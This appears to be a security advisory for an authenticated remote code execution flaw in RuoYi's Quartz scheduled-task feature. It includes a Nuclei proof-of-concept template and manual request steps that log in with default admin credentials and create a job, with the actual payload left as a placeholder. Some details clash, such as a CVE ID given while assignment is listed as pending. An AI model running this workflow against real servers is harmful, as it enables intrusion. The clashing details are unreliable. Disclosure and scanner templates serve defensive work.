# RuoYi Management System Quartz RCE Vulnerability Disclosure

## Overview

**Vulnerability Name:** RuoYi OA System Quartz Remote Code Execution (RCE)  
**Affected Version:** RuoYi Management System v4.8.2 and below  
**CVE ID:** CVE-2026-4564  
**Severity:** Critical (CVSS 3.1: 9.8)  
**Vendor:** RuoYi (若依)  
**Vendor URL:** https://github.com/yangzongzhuan/RuoYi  
**Discovered by:** moonsec  

## Description

RuoYi Management System is a popular open-source Java-based enterprise management system widely used in China. The system contains a critical Remote Code Execution (RCE) vulnerability in its Quartz scheduled task management feature. An authenticated attacker with administrative privileges can exploit this vulnerability to execute arbitrary system commands on the target server.

## Vulnerability Details

### Root Cause

The vulnerability exists in the Quartz scheduled task management module (`/monitor/job`). The system allows administrators to create scheduled tasks with custom `invokeTarget` parameters. The application fails to properly sanitize and validate the `invokeTarget` parameter, allowing attackers to inject malicious expressions that can lead to remote code execution.

### Affected Endpoints

- `POST /monitor/job/add` - Add scheduled task
- `POST /monitor/job/edit` - Edit scheduled task

### Vulnerable Parameter

- `invokeTarget` - The target method to be invoked by the scheduled task

### Attack Vector

1. Attacker logs in with administrative credentials
2. Navigates to System Monitoring → Scheduled Tasks
3. Creates a new scheduled task with a malicious `invokeTarget` parameter
4. The malicious code executes when the scheduled task triggers

## Proof of Concept (PoC)

### Nuclei Template

```yaml
id: ruoyi-quartz-rce

info:
  name: RuoYi OA System Quartz RCE
  author: moonsec
  severity: critical
  description: |
    RuoYi Management System v4.8.2 and below contains a Remote Code Execution (RCE)
    vulnerability in the Quartz scheduled task feature.
  reference:
    - https://github.com/yangzongzhuan/RuoYi
  metadata:
    verified: true
    fofa-query: title="RuoYi"
  tags: ruoyi,rce,quartz

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0

        username={{username}}&password={{password}}&validateCode=1234

      - |
        GET /monitor/job HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Cookie: {{extracted_cookie}}

    cookie-reuse: true

    matchers:
      - type: word
        part: body
        words:
          - "定时任务"
          - "quartz"
        condition: or

    extractors:
      - type: regex
        name: extracted_cookie
        part: header
        regex:
          - "JSESSIONID=[^;]+"
        internal: true

  - raw:
      - |
        POST /monitor/job/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0
        Cookie: {{extracted_cookie}}

        jobName=RCE_Test&jobGroup=DEFAULT&invokeTarget=ryTask.ryNoParams&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1&concurrent=1&status=0

    matchers:
      - type: word
        part: body
        words:
          - "success"
          - "操作成功"
        condition: or

variables:
  username: "admin"
  password: "admin123"
```

### Manual Exploitation Steps

1. **Login to the system:**
   ```
   POST /login
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=admin123&validateCode=<captcha>
   ```

2. **Access the Quartz job management page:**
   ```
   GET /monitor/job
   ```

3. **Create a malicious scheduled task:**
   ```
   POST /monitor/job/add
   Content-Type: application/x-www-form-urlencoded
   
   jobName=RCE_Test&jobGroup=DEFAULT&invokeTarget=<malicious_payload>&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1&concurrent=1&status=0
   ```

## Impact

Successful exploitation of this vulnerability allows an attacker to:

- Execute arbitrary system commands on the target server
- Gain complete control over the affected system
- Access sensitive data stored in the database
- Pivot to internal networks
- Install persistent backdoors

## Affected Versions

- RuoYi Management System v4.8.2 and below
- All versions using the Quartz scheduling module with default configurations

## Mitigation

### Immediate Actions

1. **Update to the latest version** of RuoYi Management System
2. **Disable the Quartz scheduled task feature** if not required
3. **Implement strict input validation** for the `invokeTarget` parameter
4. **Use parameterized queries** and avoid dynamic method invocation

### Recommended Security Measures

1. **Network Segmentation:** Isolate the management system from public networks
2. **Access Control:** Implement strong authentication and least privilege principles
3. **Monitoring:** Enable logging and monitoring for suspicious activities
4. **WAF Rules:** Deploy Web Application Firewall rules to block malicious requests

## Timeline

- **2025-03-08:** Vulnerability discovered
- **2025-03-08:** Initial disclosure to vendor
- **Pending:** Vendor response
- **Pending:** CVE assignment
- **Pending:** Public disclosure

## References

- [RuoYi Official Repository](https://github.com/yangzongzhuan/RuoYi)
- [RuoYi Documentation](http://doc.ruoyi.vip/)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)

## Credits

- **Discovered by:** moonsec
- **Nuclei Template:** moonsec

## Disclaimer

This vulnerability disclosure is provided for educational and defensive purposes only. The author is not responsible for any misuse of the information provided. Always obtain proper authorization before testing security vulnerabilities.

## License

This disclosure is released under the [MIT License](LICENSE).

---

**Note:** This is a responsible disclosure. The vulnerability details have been shared with the vendor prior to public disclosure to allow for patch development.
